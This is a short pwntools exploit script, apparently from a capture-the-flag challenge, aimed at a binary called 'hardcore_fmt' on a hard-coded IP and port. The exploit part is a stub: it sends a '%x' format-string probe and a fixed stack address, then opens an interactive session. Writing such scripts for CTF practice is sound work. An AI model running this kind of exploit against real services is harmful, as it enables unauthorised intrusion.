#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hardcore_fmt')

host = args.HOST or '39.106.110.69'
port = int(args.PORT or 9999)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x555555554901
break *0x555555554931
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']
io = start()
io.sendline('%x' * 3)
io.sendline(str(0x00007ffffffdd000))

io.interactive()

